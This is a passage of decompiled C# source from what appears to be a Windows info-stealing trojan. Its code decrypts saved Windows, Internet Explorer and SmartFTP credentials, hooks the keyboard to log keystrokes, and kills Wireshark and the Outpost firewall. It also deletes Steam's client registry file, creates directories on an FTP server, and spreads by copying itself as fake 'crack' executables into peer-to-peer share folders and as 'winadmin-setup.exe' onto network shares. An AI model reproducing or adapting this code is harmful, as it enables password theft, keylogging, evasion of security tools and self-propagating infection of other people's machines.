				Marshal.FreeHGlobal(intPtr2);
			}
			Class34.CredFree(intptr_);
			Class34.smethod_46(class10_0);
			Class34.RegCloseKey_1(int_);
			byte[] array = new byte[18]
			{
				38, 48, 111, 102, 81, 101, 56, 82, 98, 108,
				78, 100, 103, 110, 90, 83, 85, 74
			};
			IntPtr intPtr6 = Marshal.AllocHGlobal(38);
			i = 0;
			do
			{
				byte val = (byte)(unchecked((int)checked((byte)(array[17 - i] ^ 0xC))) + (17 - i));
				Marshal.WriteInt16(intPtr6, i * 2, val);
				i++;
			}
			while (i <= 17);
			Marshal.WriteInt16(intPtr6, 36, 0);
			Class34.CredEnumerateW_2(intPtr6, 0, ref int_12, ref intptr_);
			if (int_12 > 0)
			{
				int num4 = int_12 - 1;
				for (i = 0; i <= num4; i++)
				{
					IntPtr intPtr = Marshal.ReadIntPtr(intptr_, i * 4);
					object? obj2 = Marshal.PtrToStructure(intPtr, @struct.GetType());
					@struct = ((obj2 != null) ? ((Class10.Struct16)obj2) : struct2);
					struct14_.int_1 = @struct.int_5;
					struct14_.int_0 = @struct.int_4;
					Class34.CryptUnprotectData_1(ref struct14_, 0, 0, 0, 0, 1, ref struct14_2);
					struct14_2.int_1 = struct14_.int_1;
					List<Class17> list_4 = class10_0.list_0;
					IntPtr intptr_5 = intPtr5;
					intPtr5 = new IntPtr(@struct.int_10);
					string string_6 = Class34.smethod_142(intptr_5, (Class8)class10_0);
					IntPtr intPtr4 = new IntPtr(struct14_2.int_1);
					string string_5 = Marshal.PtrToStringUni(intPtr4, (int)Math.Round((double)struct14_.int_0 / 2.0));
					IntPtr intptr_6 = intPtr3;
					intPtr3 = new IntPtr(@struct.int_2);
					string_ = Class34.smethod_142(intptr_6, (Class8)class10_0);
					list_4.Add(new Class17(ref string_6, ref string_5, ref string_));
				}
			}
			Class34.CredFree(intptr_);
			Marshal.FreeHGlobal(intPtr6);
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern IntPtr GetModuleHandleA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	static void smethod_13(Form1 form1_0)
	{
		using WebClient webClient = new WebClient();
		try
		{
			form1_0.string_69 = webClient.DownloadString("http://whatismyip.com/automation/n09230945.asp");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	static DateTime smethod_14(ref Class16.Struct11 struct11_0, Class16 class16_0)
	{
		Class34.FileTimeToLocalFileTime_1(ref struct11_0, ref class16_0.struct11_0);
		Class34.FileTimeToSystemTime_1(ref class16_0.struct11_0, ref class16_0.struct13_0);
		return DateTime.FromOADate(DateAndTime.DateSerial((int)class16_0.struct13_0.short_0, (int)class16_0.struct13_0.short_1, (int)class16_0.struct13_0.short_3).ToOADate() + DateAndTime.TimeSerial((int)class16_0.struct13_0.short_4, (int)class16_0.struct13_0.short_5, (int)class16_0.struct13_0.short_6).ToOADate());
	}

	static void smethod_15(Form1 form1_0)
	{
		string text = "ftp://" + form1_0.vmethod_0().get_Text();
		string text2 = form1_0.vmethod_4().get_Text();
		string text3 = form1_0.vmethod_2().get_Text();
		string text4 = form1_0.vmethod_12().get_Text();
		FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(text + "/" + text4);
		ftpWebRequest.Method = "MKD";
		ftpWebRequest.Credentials = new NetworkCredential(text2, text3);
		ftpWebRequest.GetResponse();
	}

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int RegCloseKey(int int_0);

	static Class12 smethod_16(Class13 class13_0, int int_0)
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		int rgelt = default(int);
		int pceltFetched = default(int);
		Class12 @class = default(Class12);
		IntPtr intPtr = default(IntPtr);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num2 = 2;
					class13_0.ginterface0_0.Reset();
					class13_0.ginterface0_0.Skip(int_0);
					class13_0.ginterface0_0.Next(1, ref rgelt, ref pceltFetched);
					@class = null;
					if (rgelt != 0)
					{
						@class = new Class12();
						GInterface3 ginterface3_ = class13_0.ginterface3_0;
						Enum1 enum1_ = class13_0.enum1_0;
						ref Guid guid_ = ref class13_0.guid_0;
						ref Guid guid_2 = ref class13_0.guid_1;
						IntPtr intptr_ = intPtr;
						intPtr = new IntPtr(rgelt);
						string string_ = Class34.smethod_142(intptr_, (Class8)class13_0);
						Class34.smethod_65(ref guid_, ref guid_2, string_, @class, ginterface3_, enum1_);
						intPtr = new IntPtr(rgelt);
						Marshal.FreeCoTaskMem(intPtr);
					}
					break;
				case 141:
					num = -1;
					switch (num2)
					{
					case 2:
						break;
					default:
						goto IL_00c7;
					}
					break;
				}
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 141;
				continue;
			}
			break;
			IL_00c7:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		Class12 result = @class;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern long FindWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1);

	[DllImport("kernel32")]
	static extern IntPtr HeapAlloc(IntPtr intptr_0, uint uint_0, uint uint_1);

	static void smethod_17(Class9.Struct6 struct6_0, Class9 class9_0, string string_0, string string_1)
	{
		Class9.Struct8 @struct = default(Class9.Struct8);
		int num = Strings.Len((object)@struct);
		Class9.Struct7 struct2 = default(Class9.Struct7);
		Strings.Len((object)struct2);
		int int_ = struct6_0.int_1;
		IntPtr ptr = new IntPtr(struct6_0.int_1);
		checked
		{
			IntPtr ptr2 = new IntPtr(int_ + unchecked((int)Marshal.ReadByte(ptr)));
			object? obj = Marshal.PtrToStructure(ptr2, struct2.GetType());
			Class9.Struct7 struct3 = default(Class9.Struct7);
			struct2 = ((obj != null) ? ((Class9.Struct7)obj) : struct3);
			Class9.Struct8 struct4 = default(Class9.Struct8);
			if (struct2.int_4 == 1)
			{
				if (struct2.int_2 < 2)
				{
					return;
				}
				IntPtr intPtr = new IntPtr(ptr2.ToInt32() + struct2.int_1);
				IntPtr intPtr2 = new IntPtr(intPtr.ToInt32() + struct2.int_2 * num);
				int num2 = struct2.int_2 - 1;
				for (int i = 0; i <= num2; i += 2)
				{
					if ((intPtr2 == IntPtr.Zero) | (intPtr == IntPtr.Zero))
					{
						break;
					}
					object? obj2 = Marshal.PtrToStructure(intPtr, @struct.GetType());
					@struct = ((obj2 != null) ? ((Class9.Struct8)obj2) : struct4);
					IntPtr intptr_ = new IntPtr(intPtr2.ToInt32() + @struct.int_0);
					string string_2;
					if (Class34.lstrlenA_1(intptr_) != @struct.int_1)
					{
						ptr = new IntPtr(intPtr2.ToInt32() + @struct.int_0);
						string_2 = Marshal.PtrToStringUni(ptr);
					}
					else
					{
						intptr_ = new IntPtr(intPtr2.ToInt32() + @struct.int_0);
						string_2 = Marshal.PtrToStringAnsi(intptr_);
					}
					intPtr = new IntPtr(intPtr.ToInt32() + num);
					object? obj3 = Marshal.PtrToStructure(intPtr, @struct.GetType());
					@struct = ((obj3 != null) ? ((Class9.Struct8)obj3) : struct4);
					string text = Strings.Space(@struct.int_1);
					intptr_ = new IntPtr(intPtr2.ToInt32() + @struct.int_0);
					if (Class34.lstrlenA_1(intptr_) != @struct.int_1)
					{
						ptr = new IntPtr(intPtr2.ToInt32() + @struct.int_0);
						text = Marshal.PtrToStringUni(ptr);
					}
					else
					{
						intptr_ = new IntPtr(intPtr2.ToInt32() + @struct.int_0);
						text = Marshal.PtrToStringAnsi(intptr_);
					}
					intPtr = new IntPtr(intPtr.ToInt32() + num);
					class9_0.list_0.Add(new Class7(string_0, string_1, string_2, text, Class34.smethod_1(ref @struct.struct4_0, class9_0), 1, string.Empty));
				}
			}
			else
			{
				if (struct2.int_4 != 0)
				{
					return;
				}
				string text = null;
				IntPtr intPtr = new IntPtr(ptr2.ToInt32() + struct2.int_1);
				IntPtr intPtr2 = new IntPtr(intPtr.ToInt32() + struct2.int_2 * num);
				if ((intPtr2 == IntPtr.Zero) | (intPtr == IntPtr.Zero))
				{
					return;
				}
				int num3 = struct2.int_2 - 1;
				for (int j = 0; j <= num3; j++)
				{
					object? obj4 = Marshal.PtrToStructure(intPtr, @struct.GetType());
					@struct = ((obj4 != null) ? ((Class9.Struct8)obj4) : struct4);
					string string_2 = Strings.Space(@struct.int_1);
					IntPtr intptr_ = new IntPtr(intPtr2.ToInt32() + @struct.int_0);
					if (Class34.lstrlenA_1(intptr_) != @struct.int_1)
					{
						ptr = new IntPtr(intPtr2.ToInt32() + @struct.int_0);
						string_2 = Marshal.PtrToStringUni(ptr);
					}
					else
					{
						intptr_ = new IntPtr(intPtr2.ToInt32() + @struct.int_0);
						string_2 = Marshal.PtrToStringAnsi(intptr_);
					}
					intPtr = new IntPtr(intPtr.ToInt32() + num);
					class9_0.list_0.Add(new Class7(string_0, string_1, string_2, string.Empty, Class34.smethod_1(ref @struct.struct4_0, class9_0), 0, string.Empty));
				}
			}
		}
	}

	static void smethod_18(Class40 class40_0)
	{
		class40_0.type_0.GetMethod("Clear")!.Invoke(class40_0.object_0, new object[0]);
	}

	[DllImport("kernel32")]
	static extern IntPtr GetProcessHeap();

	static void smethod_19(Form1 form1_0)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		Process[] processes = default(Process[]);
		int num6 = default(int);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 163:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0011;
						case 4:
							goto IL_0020;
						case 6:
						case 7:
							goto IL_0031;
						case 8:
							goto IL_0043;
						case 5:
						case 9:
						case 10:
						case 11:
						case 12:
							goto IL_004e;
						default:
							goto end_IL_0000;
						case 13:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_004e:
					num = 12;
					num5 = checked(num5 + 1);
					goto IL_001c;
					IL_0008:
					num = 2;
					processes = Process.GetProcesses();
					goto IL_0011;
					IL_0011:
					num = 3;
					num6 = checked(processes.Length - 1);
					num5 = 0;
					goto IL_001c;
					IL_001c:
					if (num5 > num6)
					{
						goto end_IL_0000_2;
					}
					goto IL_0020;
					IL_0020:
					num = 4;
					text = Strings.LCase(processes[num5].ProcessName);
					goto IL_0031;
					IL_0031:
					num = 7;
					if (Operators.CompareString(text, "wireshark", false) == 0)
					{
						goto IL_0043;
					}
					goto IL_004e;
					IL_0043:
					num = 8;
					processes[num5].Kill();
					goto IL_004e;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 163;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static Class13 smethod_20(Guid guid_0, Class14 class14_0, Guid guid_1)
	{
		return new Class13(class14_0.ginterface3_0, class14_0.enum1_0, ref guid_0, ref guid_1);
	}

	static void smethod_21(Form1 form1_0)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 83:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 4:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0007:
					num = 2;
					text = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Valve\\Steam", "InstallPath", null));
					break;
					end_IL_0000_2:
					break;
				}
				num = 3;
				FileSystem.Kill(text + "ClientRegistry.blob");
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 83;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int CreateIdentityHandle(IntPtr intptr_0, int int_0, ref int int_1);

	[DllImport("shell32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int SHGetSpecialFolderLocation(int int_0, int int_1, ref int int_2);

	static void smethod_22()
	{
		ArrayList arrayList = new ArrayList();
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\Downloads");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\My Shared Folder");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\Shared");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Ares\\My Shared Folder");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Downloads");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Shareaza\\Downloads");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\emule\\incoming\\");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\kazaa\\my shared folder\\");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\kazaa lite\\my shared folder\\");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\kazaa lite k++\\my shared folder\\");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\icq\\shared folder\\");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\grokster\\my grokster\\");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\bearshare\\shared\\");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\edonkey2000\\incoming\\");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\morpheus\\my shared folder\\");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\limewire\\shared\\");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\tesla\\files\\");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\winmx\\shared\\");
		IEnumerator enumerator = arrayList.GetEnumerator();
		while (enumerator.MoveNext())
		{
			string text = Convert.ToString(RuntimeHelpers.GetObjectValue(enumerator.Current));
			if (Directory.Exists(text))
			{
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
				string[] directories = Directory.GetDirectories(folderPath);
				foreach (string text2 in directories)
				{
					string destFileName = text + "\\" + text2.Substring(text2.LastIndexOf("\\")).Replace("\\", string.Empty) + "-crack.exe";
					File.Copy(Class24.string_0, destFileName, overwrite: true);
				}
			}
		}
	}

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int CredFree(IntPtr intptr_0);

	static string smethod_23(Form1 form1_0)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		ManagementObject val = new ManagementObject("Win32_LogicalDisk.DeviceID=\"C:\"");
		PropertyData val2 = ((ManagementBaseObject)val).get_Properties().get_Item("VolumeSerialNumber");
		return val2.get_Value().ToString();
	}

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int PassportFreeMemory(IntPtr intptr_0);

	static string smethod_24(Class15 class15_0)
	{
		return class15_0.string_2;
	}

	static int smethod_25(int int_0, int int_1, ref Form1.Class5.Struct0 struct0_0)
	{
		if (int_0 == 0)
		{
			switch (int_1)
			{
			case 256:
			case 260:
				Form1.Class5.delegate1_0?.Invoke((Keys)struct0_0.int_0);
				break;
			case 257:
			case 261:
				Form1.Class5.delegate2_0?.Invoke((Keys)struct0_0.int_0);
				break;
			}
		}
		return Class34.CallNextHookEx(Form1.Class5.int_0, int_0, int_1, struct0_0);
	}

	static int smethod_26(byte[] byte_0, int int_0, Class41.Class42 class42_0, int int_1)
	{
		int num = 0;
		do
		{
			if (class42_0.int_4 != 11)
			{
				int num2 = Class34.smethod_158(byte_0, class42_0.class44_0, int_1, int_0);
				int_1 += num2;
				num += num2;
				int_0 -= num2;
				if (int_0 == 0)
				{
					return num;
				}
			}
		}
		while (Class34.smethod_101(class42_0) || (class42_0.class44_0.int_1 > 0 && class42_0.int_4 != 11));
		return num;
	}

	static string smethod_27(Class17 class17_0)
	{
		return class17_0.string_2;
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int UnhookWindowsHookEx(int int_0);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int EnumIdentitiesWithCachedCredentials([MarshalAs(UnmanagedType.LPWStr)] string string_0, ref int int_0);

	static Class41.Class45 smethod_28(Class41.Class46 class46_0)
	{
		byte[] array = new byte[class46_0.int_4];
		Array.Copy(class46_0.byte_1, class46_0.int_3, array, 0, class46_0.int_4);
		return new Class41.Class45(array);
	}

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int RegQueryValueExA(int int_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, int int_1, ref int int_2, IntPtr intptr_0, ref int int_3);

	static void smethod_29()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("select * from win32_share");
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = val.Get().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					string text = Convert.ToString(RuntimeHelpers.GetObjectValue(((ManagementBaseObject)val2).get_Item("Name")));
					if (!text.Contains("$"))
					{
						File.Copy(Class24.string_0, "\\\\" + Environment.MachineName + "\\" + text + "\\winadmin-setup.exe", overwrite: true);
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			string name = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Map Network Drive MRU\\";
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name);
			string[] valueNames = registryKey.GetValueNames();
			foreach (string text2 in valueNames)
			{
				string text3 = registryKey.GetValue(text2)!.ToString();
				if (Operators.CompareString(text2.ToLower(), "mrulist", false) != 0)
				{
					try
					{
						File.Copy(Class24.string_0, text3 + "\\\\winadmin-setup.exe", overwrite: true);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
			}
			registryKey.Close();
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern IntPtr LoadResource(IntPtr intptr_0, IntPtr intptr_1);

	static string smethod_30(Form1 form1_0)
	{
		string string_ = Interaction.Environ("APPDATA") + "\\SmartFTP\\Client 2.0\\Favorites\\Quick Connect\\" + FileSystem.Dir(Interaction.Environ("APPDATA") + "\\SmartFTP\\Client 2.0\\Favorites\\Quick Connect\\*.xml", (FileAttribute)0);
		string string_2 = Class34.smethod_151(form1_0, string_);
		string string_3 = "<Host>";
		string string_4 = "</Host>";
		string text = Class34.smethod_5(string_3, string_4, form1_0, string_2);
		string_3 = "<Port>";
		string_4 = "</Port>";
		string text2 = Class34.smethod_5(string_3, string_4, form1_0, string_2);
		string_3 = "<User>";
		string_4 = "</User>";
		string text3 = Class34.smethod_5(string_3, string_4, form1_0, string_2);
		string_3 = "<Password>";
		string_4 = "</Password>";
		string text4 = Class34.smethod_5(string_3, string_4, form1_0, string_2);
		string_3 = "<Name>";
		string_4 = "</Name>";
		string text5 = Class34.smethod_5(string_3, string_4, form1_0, string_2);
		if (Operators.CompareString(text3, "", false) != 0)
		{
			return "Entry: " + text5 + "\r\nHost: " + text + ":" + text2 + "\r\nUser: " + text3 + "\r\nPwd: " + text4 + " (Encrypt)";
		}
		return "No Records_Found......!";
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int FreeLibrary(int int_0);

	static void smethod_31(Form1 form1_0)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		Process[] processes = default(Process[]);
		int num6 = default(int);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 163:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0011;
						case 4:
							goto IL_0020;
						case 6:
						case 7:
							goto IL_0031;
						case 8:
							goto IL_0043;
						case 5:
						case 9:
						case 10:
						case 11:
						case 12:
							goto IL_004e;
						default:
							goto end_IL_0000;
						case 13:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_004e:
					num = 12;
					num5 = checked(num5 + 1);
					goto IL_001c;
					IL_0008:
					num = 2;
					processes = Process.GetProcesses();
					goto IL_0011;
					IL_0011:
					num = 3;
					num6 = checked(processes.Length - 1);
					num5 = 0;
					goto IL_001c;
					IL_001c:
					if (num5 > num6)
					{
						goto end_IL_0000_2;
					}
					goto IL_0020;
					IL_0020:
					num = 4;
					text = Strings.LCase(processes[num5].ProcessName);
					goto IL_0031;
					IL_0031:
					num = 7;
					if (Operators.CompareString(text, "outpost", false) == 0)
					{
						goto IL_0043;
					}
					goto IL_004e;
					IL_0043:
					num = 8;
					processes[num5].Kill();
					goto IL_004e;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 163;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("crypt32.dll", CharSet = CharSet.Ansi, EntryPoint = "CryptUnprotectData", ExactSpelling = true, SetLastError = true)]
	static extern int CryptUnprotectData_1(ref Class10.Struct14 struct14_0, int int_0, int int_1, int int_2, int int_3, int int_4, ref Class10.Struct14 struct14_1);

	static void smethod_32(string string_0)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (process.ProcessName.Contains(string_0))
			{
				try
				{
					process.Kill();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	[DllImport("wininet.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int FindNextUrlCacheEntryA(int int_0, IntPtr intptr_0, ref int int_1);

	static void smethod_33(Class9 class9_0, string string_0, int int_0)
	{
		string_0 = Strings.LCase(string_0);
		byte[] byte_ = Encoding.Unicode.GetBytes(string_0);
		string string_ = Class34.smethod_105(ref byte_, class9_0);
		string_ += Strings.Right("00" + Conversion.Hex(Class34.smethod_110(class9_0, ref string_)), 2);
		int int_ = default(int);
		int int_2 = default(int);
		Class34.RegQueryValueExA_1(int_0, ref string_, 0, ref int_, IntPtr.Zero, ref int_2);
		if (int_2 > 0)
		{
			IntPtr intptr_ = Marshal.AllocHGlobal(int_2);
			Class34.RegQueryValueExA_1(int_0, ref string_, 0, ref int_, intptr_, ref int_2);
			Class9.Struct6 struct6_ = default(Class9.Struct6);
			struct6_.int_0 = int_2;
			struct6_.int_1 = intptr_.ToInt32();
			Class9.Struct6 struct6_2 = default(Class9.Struct6);
			struct6_2.int_0 = checked(Strings.Len(string_0) * 2 + 2);
			struct6_2.int_1 = Marshal.StringToHGlobalUni(string_0).ToInt32();
			Class9.Struct6 struct6_3 = default(Class9.Struct6);
			Class34.CryptUnprotectData_3(ref struct6_, 0, ref struct6_2, 0, 0, 0, ref struct6_3);
			Class34.smethod_17(struct6_3, class9_0, string_, string_0);
			IntPtr hglobal = new IntPtr(struct6_2.int_1);
			Marshal.FreeHGlobal(hglobal);
			Class34.LocalFree(struct6_3.int_1);
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern IntPtr GetProcAddress(IntPtr intptr_0, string string_0);

	static void smethod_34(Class9 class9_0)
	{
		Regex regex = new Regex("name=\"([^\"]+)\"", RegexOptions.Compiled);
		class9_0.list_0.Clear();
		string string_ = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage1";
		int int_ = default(int);
		Class34.RegOpenKeyExA_1(-2147483647, ref string_, 0, 131097, ref int_);
		string_ = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2";
		int int_2 = default(int);
		Class34.RegOpenKeyExA_1(-2147483647, ref string_, 0, 131097, ref int_2);
		if (int_2 != 0 || int_ != 0)
		{
			string_ = null;
			int int_3 = default(int);
			int num = Class34.FindFirstUrlCacheEntryA(ref string_, IntPtr.Zero, ref int_3);
			if (int_3 > 0)
			{
				IntPtr intPtr = Marshal.AllocHGlobal(int_3);
				Marshal.WriteInt32(intPtr, int_3);
				string_ = null;
				num = Class34.FindFirstUrlCacheEntryA(ref string_, intPtr, ref int_3);
				Class9.Struct5 @struct = default(Class9.Struct5);
				Class9.Struct5 struct2 = default(Class9.Struct5);
				IEnumerator enumerator = default(IEnumerator);
				do
				{
					object? obj = Marshal.PtrToStructure(intPtr, @struct.GetType());
					@struct = ((obj == null) ? struct2 : ((Class9.Struct5)obj));
					if (((uint)@struct.int_3 & 0x200001u) != 0)
					{
						IntPtr intptr_ = new IntPtr(@struct.int_1);
						string text = Class34.smethod_117(class9_0, intptr_);
						if (text.IndexOf("?") >= 0)
						{
							text = text.Substring(0, text.IndexOf("?"));
						}
						if (Strings.InStr(text, "@", (CompareMethod)0) > 0)
						{
							text = Strings.Mid(text, checked(Strings.InStr(text, "@", (CompareMethod)0) + 1));
						}
						if (int_ != 0 && (@struct.int_3 & 1) == 1)
						{
							intptr_ = new IntPtr(@struct.int_8);
							string text2 = Class34.smethod_117(class9_0, intptr_);
							if (!string.IsNullOrEmpty(text2) && text2.Contains("text/html"))
							{
								intptr_ = new IntPtr(@struct.int_2);
								string path = Class34.smethod_117(class9_0, intptr_);
								try
								{
									try
									{
										enumerator = regex.Matches(File.ReadAllText(path)).GetEnumerator();
										while (enumerator.MoveNext())
										{
											Match match = (Match)enumerator.Current;
											Class34.smethod_33(class9_0, match.Groups[1].Value, int_);
										}
									}
									finally
									{
										if (enumerator is IDisposable)
										{
											(enumerator as IDisposable).Dispose();
										}
									}
								}
								catch (Exception projectError)
								{
									ProjectData.SetProjectError(projectError);
									ProjectData.ClearProjectError();
								}
							}
						}
						Class34.smethod_33(class9_0, text, int_2);
					}
					int_3 = 0;
					Class34.FindNextUrlCacheEntryA(num, IntPtr.Zero, ref int_3);
					Marshal.FreeHGlobal(intPtr);
					if (int_3 > 0)
					{
						intPtr = Marshal.AllocHGlobal(int_3);
						Marshal.WriteInt32(intPtr, int_3);
					}
				}
				while (Class34.FindNextUrlCacheEntryA(num, intPtr, ref int_3) != 0);
				Class34.FindCloseUrlCache(num);
			}
			Class34.RegCloseKey(int_);
			Class34.RegCloseKey(int_2);
		}
		string string_2 = "Microsoft_WinInet_*";
		int int_4 = default(int);
		int int_5 = default(int);
		Class34.CredEnumerateW(string_2, 0, ref int_4, ref int_5);
		checked
		{
			Class9.Struct6 struct6_ = default(Class9.Struct6);
			Class9.Struct6 struct6_2 = default(Class9.Struct6);
			Class9.Struct6 struct6_3 = default(Class9.Struct6);
			if (int_4 > 0)
			{
				int num2 = int_4 - 1;
				Class9.Struct9 struct3 = default(Class9.Struct9);
				Class9.Struct9 struct4 = default(Class9.Struct9);
				for (int i = 0; i <= num2; i++)
				{
